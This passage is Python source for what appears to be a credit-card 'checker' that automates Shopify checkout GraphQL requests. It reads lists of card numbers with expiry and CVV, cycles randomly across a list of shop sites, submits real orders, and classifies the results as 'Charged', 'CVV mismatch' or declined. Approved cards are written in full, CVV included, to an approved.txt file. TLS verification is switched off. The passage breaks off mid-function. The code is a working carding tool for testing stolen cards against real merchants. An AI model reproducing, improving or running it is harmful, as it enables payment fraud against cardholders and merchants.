                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    
    if r.status_code == 200:
        try:
            response = r.json()
            
            if not SUMMARY_ONLY:
                with open("proposal_response.json", "w") as f:
                    json.dump(response, f, indent=2)
            
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                return None, None, None, None, None, False
            
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            
            if result.get('__typename') != 'NegotiationResultAvailable':
                return None, None, None, None, None, False
            
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            
            phone_required = detect_phone_requirement(seller_proposal)
            
            shipping_handle = None
            shipping_amount = None
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  [OK] Shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        if shipping_amount:
                            print(f"  [OK] Shipping amount: ${shipping_amount}")
            elif delivery_typename == 'PendingTerms':
                print(f"  [INFO] Delivery terms are pending (will need to wait)")
            
            actual_total = None
            checkout_total = seller_proposal.get('checkoutTotal', {})
            if checkout_total.get('__typename') == 'MoneyValueConstraint':
                value = checkout_total.get('value', {})
                actual_total = value.get('amount')
                if actual_total:
                    print(f"  [OK] Total: ${actual_total}")
            
            delivery_expectations = []
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            typename = delivery_exp_terms.get('__typename') if isinstance(delivery_exp_terms, dict) else None
            
            if typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  [OK] Found {len(delivery_expectations)} expectations")
            
            elif typename == 'PendingTerms':
                print(f"  [INFO] Expectations pending...")
                
                if delivery_typename == 'PendingTerms':
                    print(f"  [INFO] Both delivery and expectations pending - using comprehensive poll")
                    poll_result = poll_for_delivery_and_expectations(
                        session, checkout_token, session_token, merchandise_stable_id
                    )
                    
                    if poll_result[0]:
                        queue_token_new, shipping_handle_new, shipping_amount_new, actual_total_new, delivery_expectations_new = poll_result
                        if queue_token_new:
                            queue_token = queue_token_new
                        if shipping_handle_new:
                            shipping_handle = shipping_handle_new
                        if shipping_amount_new:
                            shipping_amount = shipping_amount_new
                        if actual_total_new:
                            actual_total = actual_total_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                        print(f"  [OK] Poll complete - Handle: {shipping_handle[:30] if shipping_handle else 'None'}...")
                    else:
                        print(f"  [WARNING] Comprehensive polling failed")
                
                elif shipping_handle:
                    print(f"  [INFO] Starting poll with handle: {shipping_handle[:50]}...")
                    polled_data = poll_proposal(
                        session, checkout_token, session_token, merchandise_stable_id, 
                        shipping_handle, phone_required, shipping_amount
                    )
                    
                    if polled_data and polled_data[0]:
                        queue_token_new, delivery_expectations_new = polled_data
                        if queue_token_new:
                            queue_token = queue_token_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                    else:
                        print(f"  [WARNING] Polling failed, continuing without expectations")
                else:
                    print(f"  [WARNING] No shipping handle available, skipping poll")
            
            print(f"  [INFO] Phone Required: {phone_required}")
            
            return queue_token, shipping_handle, merchandise_stable_id, actual_total, delivery_expectations, phone_required
            
        except json.JSONDecodeError:
            print(f"  [ERROR] Invalid JSON")
            return None, None, None, None, None, False
    else:
        print(f"  [ERROR] Failed: {r.status_code}")
        return None, None, None, None, None, False

def step4_submit_completion(session, checkout_token, session_token, queue_token, 
                           shipping_handle, merchandise_stable_id, card_session_id, 
                           actual_total, delivery_expectations, phone_required=False):
    print("[4/5] Submitting for completion...")
    print(f"  [INFO] Phone requirement: {phone_required}")
    
    if not actual_total:
        return None, "MISSING_TOTAL", "No total amount"
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
    attempt_token = f"{checkout_token}-{uuid.uuid4().hex[:10]}"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-one-session-token': session_token,
        'x-checkout-web-source-id': checkout_token,
    }
    
    query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{__typename code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}__typename}}"""
    
    delivery_line = get_delivery_line_config(
        shipping_handle=shipping_handle,
        destination_changed=False,
        merchandise_stable_id=merchandise_stable_id,
        use_full_address=True,
        phone_required=True
    )
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "postalCode": CHECKOUT_DATA["zip"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    delivery_expectation_lines = []
    for exp in delivery_expectations:
        delivery_expectation_lines.append({"signedHandle": exp["signedHandle"]})
    
    payment_amount = actual_total
    
    input_data = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token,
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "supportsSplitShipping": True
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": merchandise_stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                        "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                        "properties": [],
                        "sellingPlanId": None
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"any": True},
                "lineComponents": []
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"value": {"amount": payment_amount, "currencyCode": "USD"}},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319",
                        "sessionId": card_session_id,
                        "billingAddress": {"streetAddress": billing_address_data},
                        "cardSource": None
                    }
                },
                "amount": {"value": {"amount": payment_amount, "currencyCode": "USD"}}
            }],
            "billingAddress": {"streetAddress": billing_address_data}
        },
        "buyerIdentity": {
            "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
            "email": CHECKOUT_DATA["email"],
            "emailChanged": False,
            "phoneCountryCode": "US",
            "marketingConsent": [],
            "shopPayOptInPhone": {"number": CHECKOUT_DATA["phone"], "countryCode": "US"},
            "rememberMe": False
        },
        "tip": {"tipLines": []},
        "taxes": {"proposedTotalAmount": {"any": True}},
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None,
            "signatureUuid": None,
            "lineItemScriptChanges": [],
            "paymentScriptChanges": [],
            "shippingScriptChanges": []
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": []
    }
    
    if delivery_expectation_lines:
        input_data["deliveryExpectations"] = {
            "deliveryExpectationLines": delivery_expectation_lines
        }
    
    payload = {
        "operationName": "SubmitForCompletion",
        "query": query,
        "variables": {
            "attemptToken": attempt_token,
            "metafields": [],
            "postPurchaseInquiryResult": None,
            "analytics": {
                "requestUrl": f"{SHOP_URL}/checkouts/cn/{checkout_token}/en-us/",
                "pageId": str(uuid.uuid4()).upper()
            },
            "input": input_data
        }
    }
    
    try:
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    except Exception as e:
        print(f"  [ERROR] HTTP request failed: {e}")
        return None, "HTTP_ERROR", str(e), {"_error": "REQUEST_EXCEPTION", "_message": str(e)}
    
    if r.status_code == 200:
        response = r.json()
        
        if not SUMMARY_ONLY:
            with open("submit_response.json", "w") as f:
                json.dump(response, f, indent=2)
        
        result = response.get('data', {}).get('submitForCompletion', {})
        result_type = result.get('__typename', 'Unknown')
        
        print(f"  [INFO] Result: {result_type}")
        
        if result_type in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            receipt = result.get('receipt', {})
            receipt_id = receipt.get('id')
            
            if receipt_id:
                print(f"  [SUCCESS] Receipt ID: {receipt_id}")
                return receipt_id, "SUBMIT_SUCCESS", None, response
            else:
                return "ACCEPTED", "SUBMIT_ACCEPTED", None, response
        
        elif result_type == 'SubmitRejected':
            errors = result.get('errors', [])
            error_codes = []
            error_messages = []
            
            for error in errors:
                code = error.get('code', 'UNKNOWN_ERROR')
                message = error.get('localizedMessage', 'No message')
                error_codes.append(code)
                error_messages.append(message)
                print(f"  [ERROR] {code}: {message}")
            
            primary_code = error_codes[0] if error_codes else "SUBMIT_REJECTED"
            combined_message = " | ".join(error_messages)
            
            return None, primary_code, combined_message, response
        
        elif result_type == 'SubmitFailed':
            reason = result.get('reason', 'Unknown')
            print(f"  [ERROR] Failed: {reason}")
            return None, "SUBMIT_FAILED", reason, response
        
        else:
            return None, "UNEXPECTED_RESULT", f"Unexpected: {result_type}", response
        
    else:
        print(f"  [ERROR] HTTP {r.status_code}")
        return None, f"HTTP_{r.status_code}", f"HTTP failed: {r.status_code}"

def step5_poll_receipt(session, checkout_token, checkout_session_token, receipt_id, capture_log: bool = False):
    log_lines = [] if capture_log else None
    attempt_blocks = [] if capture_log else None

    def _log(msg: str):
        try:
            if capture_log and log_lines is not None:
                log_lines.append(msg)
            print(msg)
        except Exception:
            pass

    def _compose_poll_log_text():
        if not capture_log:
            return None
        parts = []
        if attempt_blocks:
            parts.extend(attempt_blocks)
        if log_lines:
            parts.append("\n".join(log_lines))
        return "\n\n".join(parts) if parts else None

    _log("[5/5] Polling for receipt...")
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=PollForReceipt"
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': checkout_session_token,
    }
    query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}...on ActionRequiredReceipt{id __typename}__typename}}"""

    payload = {
        "operationName": "PollForReceipt",
        "query": query,
        "variables": {
            "receiptId": receipt_id,
            "sessionToken": checkout_session_token
        }
    }

    try:
        rid = receipt_id
        if rid is None or (isinstance(rid, str) and not rid.strip()) or (isinstance(rid, str) and not rid.startswith("gid://shopify/")):
            _log("  [ERROR] Invalid receipt_id; skipping poll.")
            stub = {"_error": "INVALID_RECEIPT_ID", "_receipt_id": rid}
            return False, stub, _compose_poll_log_text()
    except Exception:
        stub = {"_error": "INVALID_RECEIPT_ID_EXCEPTION"}
        return False, stub, _compose_poll_log_text()

    last_response = None
    collected = []
    error_no_data_strikes = 0

    for attempt in range(1, POLL_RECEIPT_MAX_ATTEMPTS + 1):
        _log(f"  Polling {attempt}/{POLL_RECEIPT_MAX_ATTEMPTS}...")
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            stub = {"_error": "REQUEST_EXCEPTION", "_message": str(e)}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            time.sleep(SHORT_SLEEP)
            continue

        response = None
        if r.status_code == 200:
            try:
                response = r.json()
            except Exception:
                response = {"_error": "INVALID_JSON", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}

            if capture_log and attempt_blocks is not None:
                try:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(response, indent=2))
                except Exception:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n{str(response)}")

            collected.append(response)
            last_response = response

            if isinstance(response, dict) and 'errors' in response and not response.get('data'):
                try:
                    errs = response.get('errors', [])
                    msg_concat = " ".join([str(e.get('message', '') or '') for e in errs if isinstance(e, dict)])
                except Exception:
                    msg_concat = ""
                if ("receiptId" in msg_concat) and (("invalid value" in msg_concat) or ("null" in msg_concat)):
                    _log("  [ERROR] Invalid receiptId reported by server; aborting poll early.")
                    return False, response, _compose_poll_log_text()
                error_no_data_strikes += 1
                if error_no_data_strikes >= 2:
                    _log("  [ERROR] Too many GraphQL errors without data; aborting poll.")
                    return False, response, _compose_poll_log_text()
                _log("  [WARN] GraphQL errors without data; will retry")
                time.sleep(SHORT_SLEEP)
                continue

            receipt = (response or {}).get('data', {}).get('receipt', {}) if isinstance(response, dict) else {}
            rtype = receipt.get('__typename')

            if rtype == 'ProcessedReceipt':
                _log("  [SUCCESS] Order completed (ProcessedReceipt).")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return True, response, _compose_poll_log_text()

            if rtype == 'ActionRequiredReceipt':
                _log("  [ACTION REQUIRED] 3-D Secure or other action required.")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()

            if rtype == 'FailedReceipt':
                _log("  [FAILED] Received FailedReceipt.")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()

            if rtype == 'ProcessingReceipt' or rtype is None:
                poll_delay = receipt.get('pollDelay', 2000) if isinstance(receipt, dict) else 2000
                wait_seconds = min((poll_delay or 2000) / 1000.0, MAX_WAIT_SECONDS)
                _log(f"  [INFO] Still processing; waiting {wait_seconds:.2f}s before retry.")
                time.sleep(wait_seconds)
                continue

            _log(f"  [WARN] Unknown receipt typename: {rtype}; will retry.")
            time.sleep(SHORT_SLEEP)
            continue

        else:
            stub = {"_error": "HTTP_NOT_200", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            _log(f"  [ERROR] HTTP {r.status_code} from PollForReceipt; retrying")
            time.sleep(SHORT_SLEEP)
            continue

    _log("  [TIMEOUT] Poll attempts exhausted; final state UNKNOWN or PROCESSING.")
    if last_response is not None:
        _log("\n[LAST_RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        _log("\n[RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        return False, last_response, _compose_poll_log_text()

    final_stub = {"error": {"code": "TIMEOUT", "message": "Receipt polling timed out with no response"}}
    _log("\n[RECEIPT_RESPONSE]")
    try:
        _log(json.dumps(final_stub, indent=2))
    except Exception:
        pass
    return False, final_stub, _compose_poll_log_text()

def read_sites_from_file(path: str):
    sites = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                s = normalize_shop_url(line)
                if s:
                    sites.append(s)
        return list(dict.fromkeys(sites))
    except FileNotFoundError:
        print(f"\n❌ [ERROR] Sites file not found: {path}")
        return []
    except Exception as e:
        print(f"\n❌ [ERROR] Failed to read sites: {e}")
        return []

def parse_cc_line(line: str):
    """Enhanced CC parser supporting multiple formats"""
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    
    MONTH_PATTERNS = [
        r'(?:jan|january|feb|february|mar|march|apr|april|may|jun|june|jul|july|aug|august|sep|september|oct|october|nov|november|dec|december)',
        r'(?:0?[1-9]|1[0-2])'
    ]
    
    YEAR_PATTERNS = [
        r'\'?\d{2}',
        r'\d{4}'    
    ]
    
    SEPARATORS = r'[\s\|\/\-\.,\;:_]'
    
    PATTERNS = [
        re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + YEAR_PATTERNS[1] + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
        
        re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + YEAR_PATTERNS[0] + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
        
        re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[0] + r")" + SEPARATORS + r"(" + "|".join(YEAR_PATTERNS) + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
        
        re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")[\/\-](" + "|".join(YEAR_PATTERNS) + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
        
        re.compile(r"\b(\d{3,4})" + SEPARATORS + r"(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + "|".join(YEAR_PATTERNS) + r")\b", re.IGNORECASE),
        
        re.compile(r"(?:card|cc|ccnum|cc num|card num|card number|cardnumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[1] + r")[\/\-](" + "|".join(YEAR_PATTERNS) + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
        
        re.compile(r"(?:card|cc|ccnum|cc num|card num|card number|cardnumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[0] + r")\s*" + SEPARATORS + r"?\s*(" + "|".join(YEAR_PATTERNS) + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
        
        re.compile(r"(?:card|cc|ccnum|cc num|card num|card number|cardnumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[1] + r")(" + YEAR_PATTERNS[1] + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
        
        re.compile(r"\b(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{3,4})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + "|".join(YEAR_PATTERNS) + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
        
        re.compile(r"\b(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{3,4})\s+(" + MONTH_PATTERNS[1] + r")[\/\-](" + "|".join(YEAR_PATTERNS) + r")\s+(\d{3,4})\b", re.IGNORECASE),
    ]
    
    def month_to_number(month_name):
        """Convert month name to number"""
        month_map = {
            'jan': 1, 'january': 1,
            'feb': 2, 'february': 2,
            'mar': 3, 'march': 3,
            'apr': 4, 'april': 4,
            'may': 5,
            'jun': 6, 'june': 6,
            'jul': 7, 'july': 7,
            'aug': 8, 'august': 8,
            'sep': 9, 'september': 9,
            'oct': 10, 'october': 10,
            'nov': 11, 'november': 11,
            'dec': 12, 'december': 12
        }
        return month_map.get(month_name[:3].lower(), 1)
    
    for pattern in PATTERNS:
        match = pattern.search(line)
        if match:
            try:
                groups = match.groups()
                
                if len(groups[0]) in [3, 4] and len(groups) == 4:
                    if len(groups[1]) >= 13:
                        cvv, card, month, year = groups
                    else:
                        card, month, year, cvv = groups
                else:
                    card, month, year, cvv = groups
                
                card = re.sub(r'[\s\-]', '', card)
                
                if not re.fullmatch(r"\d{13,19}", card):
                    continue
                
                if month.isalpha():
                    month = month_to_number(month.lower())
                else:
                    try:
                        month = int(month)
                    except:
                        continue
                
                try:
                    year = str(year).lstrip("'")
                    year_int = int(year)
                    if year_int < 100:
                        year_int += 2000
                    elif year_int < 2000:
                        year_int += 2000
                except:
                    continue
                
                if not (1 <= month <= 12):
                    continue
                
                name = "Test Card"
                remaining = line[match.end():].strip()
                if remaining and not remaining.startswith("|"):
                    name = remaining[:50]
                
                return {
                    "number": card,
                    "month": month,
                    "year": year_int,
                    "verification_value": cvv,
                    "name": name
                }
            except Exception:
                continue
    
    parts = re.split(r"[,\|;:\s]+", line)
    parts = [p for p in parts if p]
    if len(parts) < 4:
        return None
    number = re.sub(r'[\s\-]', '', parts[0])
    if not re.fullmatch(r"\d{13,19}", number or ""):
        return None
    try:
        month = int(parts[1])
        year = int(parts[2])
        if year < 100:
            year += 2000
    except Exception:
        return None
    cvv = parts[3]
    name = " ".join(parts[4:]).strip() if len(parts) > 4 else "Test Card"
    return {
        "number": number,
        "month": month,
        "year": year,
        "verification_value": cvv,
        "name": name or "Test Card"
    }

def read_cc_file(path: str):
    cards = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                card = parse_cc_line(line)
                if card:
                    cards.append(card)
        return cards
    except FileNotFoundError:
        print(f"\n❌ [ERROR] CC file not found: {path}")
        return []
    except Exception as e:
        print(f"\n❌ [ERROR] Failed to read CCs: {e}")
        return []

def choose_next_site(previous: str, sites: list):
    if not sites:
        return None
    candidates = [s for s in sites if s != previous] or sites[:]
    try:
        return random.choice(candidates)
    except Exception:
        return candidates[0]

def mask_pan(pan: str):
    try:
        digits = re.sub(r"\D", "", pan or "")
        if len(digits) >= 4:
            return "**** **** **** " + digits[-4:]
        return "****"
    except Exception:
        return "****"

def ordinal(n: int) -> str:
    try:
        n = int(n)
    except Exception:
        return str(n)
    if 10 <= (n % 100) <= 20:
        suffix = "th"
    else:
        suffix = {1: "st", 2: "nd", 3: "rd"}.get(n % 10, "th")
    return f"{n}{suffix}"

def extract_receipt_code(resp):
    try:
        receipt = resp.get('data', {}).get('receipt', {}) if isinstance(resp, dict) else {}
        t = receipt.get('__typename')
        if t == 'ProcessedReceipt':
            return 'SUCCESS'
        elif t == 'FailedReceipt':
            pe = receipt.get('processingError', {}) or {}
            code = pe.get('code')
            if isinstance(code, str) and code.strip():
                return f'"code": "{code}"'
            return '"code": "UNKNOWN"'
        elif t == 'ActionRequiredReceipt':
            return '"code": "ACTION_REQUIRED"'
        else:
            return '"code": "UNKNOWN"'
    except Exception:
        return '"code": "UNKNOWN"'

def is_unknown_code_display(s: str) -> bool:
    try:
        if not isinstance(s, str):
            return False
        t = s.strip()
        if not t:
            return False
        t_upper = t.upper()
        return (t_upper == 'UNKNOWN') or ('"CODE": "UNKNOWN"' in t_upper)
    except Exception:
        return False

def is_terminal_failure_code_display(s: str) -> bool:
    try:
        if not isinstance(s, str):
            return False
        u = s.upper()
        tokens = [
            "CARD_DECLINED",
            "DECLINED",
            "RISKY",
            "GENERIC_ERROR",
            "INCORRECT_NUMBER",
            "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
            "FUNDING_ERROR",
            "PROCESSING_ERROR",
            "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
            "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
        ]
        if any(tok in u for tok in tokens):
            return True
        return False
    except Exception:
        return False

def format_amount(amount):
    try:
        if amount is None:
            return "$0"
        s = str(amount).strip()
        if s.startswith("$"):
            return s
        return f"${s}"
    except Exception:
        return "$0"

def format_site_label(url: str) -> str:
    try:
        u = normalize_shop_url(url or "")
        host = urlparse(u).netloc or ""
        host = host.strip()
        if not host:
            return (u or "").strip()
        parts = host.split(".")
        label = parts[0] if parts else host
        if label.lower() == "www" and len(parts) > 1:
            label = parts[1]
        return label
    except Exception:
        return (url or "").strip()

def print_cc_summary(card: dict, code_display: str, amount_display: str):
    try:
        pan = str(card.get("number", "") or "")
        mm = int(card.get("month", 0) or 0)
        yy = int(card.get("year", 0) or 0)
        cvv = str(card.get("verification_value", "") or "")
        mm_str = f"{mm:02d}"
        yy_str = f"{yy % 100:02d}"
        print(f"{pan}|{mm_str}|{yy_str}|{cvv}  |  {code_display}  |  {amount_display}")
    except Exception:
        try:
            print(f"{card}|{code_display}|{amount_display}")
        except Exception:
            pass

SUMMARY_ONLY = True

def emit_summary_line(card: dict, code_display: str, amount_display: str, elapsed_seconds: float = None, site_display: str = None):
    try:
        def _status_prefix(s: str) -> str:
            u = str(s or "").upper()
            if u == "SUCCESS":
                return "💎 Charged"
            if ('"ACTION_REQUIRED"' in u) or ('ACTION_REQUIRED' in u) or ('3D' in u):
                return "⚠️ Action required"
            cvv_tokens = [
                "INCORRECT_CVC", "INVALID_CVC", "INVALID_CVV", "CVC", "CVV", "CSC",
                "PAYMENTS_CREDIT_CARD_CVV_INVALID",
                "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID",
                "PAYMENTS_CREDIT_CARD_CSC_INVALID",
                "PAYMENTS_CREDIT_CARD_SECURITY_CODE_INVALID"
            ]
            if any(tok in u for tok in cvv_tokens):
                return "❌ CVV mismatch"
            fail_tokens = [
                "CARD_DECLINED", "DECLINED", "RISKY", "GENERIC_ERROR",
                "INCORRECT_NUMBER", "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT", "FUNDING_ERROR", "PROCESSING_ERROR",
                "PAYMENTS_CREDIT_CARD_BASE_EXPIRED"
            ]
            if any(tok in u for tok in fail_tokens):
                return "❌"
            if ('"MISSING_TOTAL"' in u) or ('MISSING_TOTAL' in u):
                return "❌ Checkout Failed"
            return "ℹ️ Result"

        prefix = _status_prefix(code_display)

        pan = str(card.get("number", "") or "")
        mm = int(card.get("month", 0) or 0)
        yy = int(card.get("year", 0) or 0)
        cvv = str(card.get("verification_value", "") or "")
        mm_str = f"{mm:02d}"
        yy_str = f"{yy % 100:02d}"

        line = f"{prefix} {pan}|{mm_str}|{yy_str}|{cvv}  |  {code_display}  |  {amount_display}"

        try:
            if isinstance(elapsed_seconds, (int, float)):
                line = f"{line}  |   {elapsed_seconds:.1f}s"
        except Exception:
            pass
        try:
            if isinstance(site_display, str) and site_display.strip():
                line = f"{line}   | site : {site_display.strip()}"
        except Exception:
            pass
        try:
            print(line, file=sys.__stdout__)
        except Exception:
            print(line)

        try:
            if prefix.startswith("💎"):
                with open("approved.txt", "a", encoding="utf-8") as f:
                    f.write(line + "\n")
        except Exception:
            pass

    except Exception:
        try:
            def _status_prefix_fallback(s: str) -> str:
                u = str(s or "").upper()
                if u == "SUCCESS":
                    return "💎 Charged"
                if ('"ACTION_REQUIRED"' in u) or ('ACTION_REQUIRED' in u) or ('3D' in u):
                    return "⚠️ Action required"
                cvv_tokens = [
                    "INCORRECT_CVC", "INVALID_CVC", "INVALID_CVV", "CVC", "CVV", "CSC",
                    "PAYMENTS_CREDIT_CARD_CVV_INVALID",
                    "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID",
                    "PAYMENTS_CREDIT_CARD_CSC_INVALID",
                    "PAYMENTS_CREDIT_CARD_SECURITY_CODE_INVALID"
                ]
                if any(tok in u for tok in cvv_tokens):
                    return "❌ CVV mismatch"
                fail_tokens = [
                    "CARD_DECLINED", "DECLINED", "RISKY", "GENERIC_ERROR",
